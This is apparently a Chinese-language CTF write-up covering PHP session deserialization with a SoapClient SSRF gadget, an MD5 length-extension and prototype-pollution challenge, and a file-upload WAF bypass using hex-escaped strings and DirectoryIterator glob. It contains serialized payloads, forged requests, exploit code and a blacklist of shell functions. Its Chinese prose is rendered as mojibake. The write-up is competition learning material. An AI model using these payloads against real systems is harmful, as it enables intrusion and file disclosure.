<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET: ??d0g3=php_serialize&amp;baby=session.serialize_handler</span><br><span class="line">POST: sess=|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A9%3A%22v2ish1yan%22%3Bs%3A8%3A%22location%22%3Bs%3A63%3A%22http%3A%2F%2F127.0.0.1%3A80%2Fflag.php%3Fa%3DSplFileObject%26b%3D%2Ff1111llllllaagg%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A102%3A%22X-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dkod01dgtpdrd999ms9vqa8l5hl%0D%0AContent-Length%3A+7%0D%0A%0D%0Aadd%3D111%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>

<p>ç„¶åå†ä¼ ä¸€ä¸ªpopï¼Œè¿›è¡Œååºåˆ—åŒ–è§¦å‘<code>SoapClient::__call()</code>è¿›è¡Œssrf</p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//something in flag.php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;<span class="comment">//phpinfo</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> A;</span><br><span class="line"><span class="variable">$b</span>=<span class="keyword">new</span> B;</span><br><span class="line"><span class="variable">$c</span>=<span class="keyword">new</span> C;</span><br><span class="line"><span class="variable">$b</span>-&gt;a=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="string">&#x27;0e215962017&#x27;</span>; <span class="comment">//isset($this-&gt;a) &amp;&amp; $this-&gt;a == md5($this-&gt;a)</span></span><br><span class="line"><span class="variable">$a</span>-&gt;b=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;a=<span class="string">&#x27;aaaaaa&#x27;</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;c=<span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop=O:1:<span class="string">&quot;B&quot;</span>:3:&#123;s:1:<span class="string">&quot;a&quot;</span>;O:1:<span class="string">&quot;C&quot;</span>:2:&#123;s:1:<span class="string">&quot;a&quot;</span>;s:6:<span class="string">&quot;phpinf&quot;</span>;s:1:<span class="string">&quot;c&quot;</span>;O:1:<span class="string">&quot;A&quot;</span>:2:&#123;s:1:<span class="string">&quot;a&quot;</span>;s:11:<span class="string">&quot;0e215962017&quot;</span>;s:1:<span class="string">&quot;b&quot;</span>;r:2;&#125;&#125;s:1:<span class="string">&quot;b&quot;</span>;N;s:1:<span class="string">&quot;k&quot;</span>;N;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå¦‚æœæˆåŠŸä¼šå“åº”ä¸€æ®µæ—¶é—´ï¼Œç„¶åå†è®¿é—®é¢˜ç›®è¿æ¥ï¼ŒæŸ¥çœ‹<code>$SESSION</code>é‡Œçš„flag</p>
<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211271929975.png" title="image-20221127192811552" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211271929975.png" alt="image-20221127192811552"></a></p>
<h2 id="ç›¸å…³é“¾æ¥"><a href="#ç›¸å…³é“¾æ¥" class="headerlink" title="ç›¸å…³é“¾æ¥"></a>ç›¸å…³é“¾æ¥</h2><p><a target="_blank" rel="noopener" href="https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#PHP%E7%9A%84session%E6%9C%BA%E5%88%B6">https://mochazz.github.io/2019/01/29/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8Bsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#PHP%E7%9A%84session%E6%9C%BA%E5%88%B6</a></p>
<p><a target="_blank" rel="noopener" href="http://anquanke.com/post/id/238482">http://anquanke.com/post/id/238482</a></p>
<h1 id="ezjs"><a href="#ezjs" class="headerlink" title="ezjs"></a>ezjs</h1><ul>
<li>å“ˆå¸Œæ‰©å±•æ”»å‡»</li>
<li>åŸå‹é“¾æ±¡æŸ“</li>
</ul>
<p>ç›´æ¥å¤åˆ¶ç²˜è´´çš„åˆ«äººçš„å…¬ä¼—å·</p>
<p>è§£é¢˜æ€è·¯ </p>
<p>é¡µé¢æç¤ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--This secret is 7 characters long for security!</span><br><span class="line">hash=md5(secret+&quot;flag&quot;);//1946714cfa9deb70cc40bab32872f98a</span><br><span class="line">admin cookie is   md5(secret+urldecode(&quot;flag%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00X%00%00%00%00%00%00%00dog&quot;));</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>

<p>è”æƒ³åˆ°å“ˆå¸Œæ‹“å±•é•¿åº¦æ”»å‡»</p>
<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211281113291.png" title="å›¾ç‰‡" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211281113291.png" alt="å›¾ç‰‡"></a></p>
<p>ç„¶åç™»å½•</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /index HTTP/1.1</span><br><span class="line">Host: 47.108.29.107:23333</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/jxl,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 20</span><br><span class="line">Origin: http://47.108.29.107:23333</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://47.108.29.107:23333/</span><br><span class="line">Cookie: hash=ed63246fb602056fee4a7ec886d0a3c2</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">pwd=123&amp;userid=Admin</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211281113319.png" title="å›¾ç‰‡" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211281113319.png" alt="å›¾ç‰‡"></a></p>
<p>ç™»å½•æˆåŠŸåæç¤ºinfoflllllag é¡µé¢ï¼Œè®¿é—®åå¾—åˆ°æºä»£ç ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> isObject = obj = &gt;obj &amp;&amp; obj.<span class="property">constructor</span> &amp;&amp; obj.<span class="property">constructor</span> === <span class="title class_">Object</span>;</span><br><span class="line"><span class="keyword">const</span> merge = (a, b) = &gt;&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> attr <span class="keyword">in</span> b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_">isObject</span>(a[attr]) &amp;&amp; <span class="title function_">isObject</span>(b[attr])) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(a[attr], b[attr]);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            a[attr] = b[attr];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> clone = (a) = &gt;&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">merge</span>(&#123;&#125;,</span><br><span class="line">    a);</span><br><span class="line">&#125;</span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,</span><br><span class="line"><span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">flag</span> == <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">        flag;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;flag?????????????&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, express.<span class="title function_">json</span>(),</span><br><span class="line"><span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> str = req.<span class="property">body</span>.<span class="property">id</span>;</span><br><span class="line">    <span class="keyword">var</span> obj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(str);</span><br><span class="line">    req.<span class="property">cookies</span>.<span class="property">id</span> = <span class="title function_">clone</span>(obj);</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;info&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure>

<p>åé¢æ”¹æˆäº†å…¬ç”¨ç¯å¢ƒå°±å»å†™äº†ä¸ªç›‘æ§è„šæœ¬ï¼Œå› ä¸ºä¸€èˆ¬åšçš„åŸå‹é“¾æ±¡æŸ“çš„é¢˜æ˜¯ç¬¬ä¸€æ¬¡æ„é€ payloadè®¿é—®è¿›è¡Œæ±¡æŸ“ï¼Œç¬¬äºŒæ¬¡æ‰æ˜¯æ‰§è¡Œã€‚å°±å†™äº†ä¸ªç›‘æ§å†…å®¹çš„è„šæœ¬æŒ‚ç€äº†ï¼Œåˆ†åˆ«ç›‘æ§äº†&#x2F;,&#x2F;infoflllllag,&#x2F;Cookie ã€‚ä¸çŸ¥é“é¢˜ç›®é”™è¯¯è¿˜æ˜¯ä¸Šè½¦äº†ï¼šåœ¨&#x2F;infoflllllagé¡µé¢å¼„åˆ°äº†flag</p>
<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211281113304.png" title="å›¾ç‰‡" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211281113304.png" alt="å›¾ç‰‡"></a></p>
<p>è„šæœ¬å†…å®¹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url1 = <span class="string">&quot;http://47.108.29.107:23333/infoflllllag&quot;</span></span><br><span class="line">url2 = <span class="string">&quot;http://47.108.29.107:23333/Cookie&quot;</span></span><br><span class="line">url3 = <span class="string">&quot;http://47.108.29.107:23333/&quot;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/1.txt&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">   <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">      talk  = requests.get(url1)</span><br><span class="line">      talk2 = requests.get(url2)</span><br><span class="line">      talk3 = requests.get(url3)</span><br><span class="line">      file.write(<span class="built_in">str</span>(talk.text) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">      file.write(<span class="built_in">str</span>(talk2.text) + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">      file.write(<span class="built_in">str</span>(talk3.text) + <span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>ç›‘æ§è„šæœ¬ç”Ÿæˆçš„æ–‡ä»¶1.txtå‘ç¾¤é‡Œäº†ï¼Œcat 1.txt | grep â€œD0g3â€| moreçš„æ‰§è¡Œç»“æœï¼š</p>
<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211281113150.png" title="å›¾ç‰‡" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211281113150.png" alt="å›¾ç‰‡"></a></p>
<h1 id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h1><ul>
<li>æ–‡ä»¶ä¸Šä¼ </li>
<li>åŸç”Ÿç±»</li>
<li>phpè½¬ä¹‰</li>
</ul>
<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>çœ‹äº†åˆ«äººçš„wpï¼Œå‘ç°åªè·Ÿä»–ä»¬å·®ä¸€æ­¥ï¼Œå°±æ˜¯ç”¨è½¬ä¹‰å­—ç¬¦ç»•è¿‡å¯¹*çš„è¿‡æ»¤ğŸ˜¢</p>
<h2 id="0x01-ç»•è¿‡è¿‡æ»¤"><a href="#0x01-ç»•è¿‡è¿‡æ»¤" class="headerlink" title="0x01 ç»•è¿‡è¿‡æ»¤"></a>0x01 ç»•è¿‡è¿‡æ»¤</h2><p>åœ¨fuzzè¿‡ç¨‹ä¸­å‘ç°åªæœ‰phpæ–‡ä»¶èƒ½å¤Ÿä¸Šä¼ </p>
<p>ç„¶åä¸Šä¼ phpæ–‡ä»¶ï¼Œæ‰§è¡Œphpinfo()å¯ä»¥å‘ç°banäº†å¾ˆå¤šå‡½æ•°</p>
<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211280938249.png" title="image-20221128093849089" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211280938249.png" alt="image-20221128093849089"></a></p>
<p>ä½†æ˜¯æœ‰ä¸ªå‡½æ•°æ²¡è¢«banï¼Œ<code>file_get_contents()</code></p>
<p>æ„Ÿè§‰å°±æ˜¯ç•™ç»™æˆ‘ä»¬ç”¨çš„</p>
<p>ä½†æ˜¯è¿™ä¸ªå­—ç¬¦ä¸²åœ¨åç«¯è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥è¦ç»•ä¸€ä¸‹</p>
<p>å› ä¸ºphp7ä»¥ä¸Šå°±å¯ä»¥ä½¿ç”¨åŠ¨æ€å‡½æ•°ï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•æ¥ç»•</p>
<ul>
<li><p>å­—ç¬¦ä¸²æ‹¼æ¥</p>
<p>æˆ‘å°±æ˜¯è¿™æ ·ç»•çš„ï¼Œä½†æ˜¯åé¢å› ä¸º*å·æ²¡æœ‰ç»•è¿‡å»ï¼Œæ‰€ä»¥æœ€åä¹Ÿæ²¡åšå‡ºæ¥</p>
<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211280953112.png" title="image-20221128095341021" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211280953112.png" alt="image-20221128095341021"></a></p>
</li>
<li><p>å­—ç¬¦ä¸²è½¬ä¹‰</p>
<p>ä½¿ç”¨16è¿›åˆ¶</p>
<p>è„šæœ¬</p>
<p>å­—ç¬¦ä¸²è½¬16è¿›åˆ¶</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">string2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    result=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        result+=<span class="string">&#x27;\\x&#x27;</span>+<span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[<span class="number">2</span>:]</span><br><span class="line">    <span class="built_in">print</span>((<span class="string">&#x27;[+] &#123;&#125;=&gt;Convert_to_hex_is:&#123;&#125;&#x27;</span>).<span class="built_in">format</span>(<span class="built_in">str</span>,result))</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">str</span>=<span class="built_in">input</span>(<span class="string">&#x27;code:&#x27;</span>)</span><br><span class="line">    string2hex(<span class="built_in">str</span>)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211280955720.png" title="image-20221128095547634" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211280955720.png" alt="image-20221128095547634"></a></p>
</li>
</ul>
<h2 id="0x02-åŸç”Ÿç±»è¯»å–æ–‡ä»¶"><a href="#0x02-åŸç”Ÿç±»è¯»å–æ–‡ä»¶" class="headerlink" title="0x02 åŸç”Ÿç±»è¯»å–æ–‡ä»¶"></a>0x02 åŸç”Ÿç±»è¯»å–æ–‡ä»¶</h2><p>å¯ä»¥ç”¨file_get_contentsè·å–index.phpæºç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//è®¾ç½®ä¸Šä¼ ç›®å½•</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;ä¿ºä¸è¦å›¾ç‰‡,ç†Šå¤§&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;å“å‘¦ä½ å¹²å˜›ï¼Œå°é»‘å­...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$msg</span>.<span class="string">&quot;  &quot;</span>.<span class="variable">$img_path</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è™½ç„¶ä»–è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿ï¼Œä½†æ˜¯éƒ½æ˜¯å¯ä»¥ç»•è¿‡çš„</p>
<p>ä½¿ç”¨ <code>DirectoryIterator</code>åŸç”Ÿç±»é…åˆglobåè®®æŸ¥æ‰¾flagæ–‡ä»¶å</p>
<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211280959801.png" title="image-20221128095943728" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202211280959801.png" alt="image-20221128095943728"></a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;\x67\x6c\x6f\x62\x3a\x2f\x2f\x2f\x2a\x66\x2a&quot;</span>);</span><br><span class="line"><span class="comment">//echo new DirectoryIterator(&quot;glob:///*f*&quot;);</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æˆ‘åšé¢˜çš„æ—¶å€™å‘ç°globå¯ä»¥ä½¿ç”¨?ä½œä¸ºé€šé…ç¬¦ï¼Œæ‰€ä»¥è¿˜å¯ä»¥è¿™æ ·ï¼Œå¾—ä¸€ä¸ªä¸ªè¯•</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///??????????????&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯æ¡ä»¶å°±æ¯”è¾ƒè‹›åˆ»ï¼Œéœ€è¦ç¡®å®šflagé•¿åº¦è¦è¿™ä¹ˆé•¿ï¼Œå¦åˆ™ç›¸åŒé•¿åº¦å¯èƒ½ä¼šåŒ¹é…åˆ°å…¶ä»–çš„æ–‡ä»¶å</p>
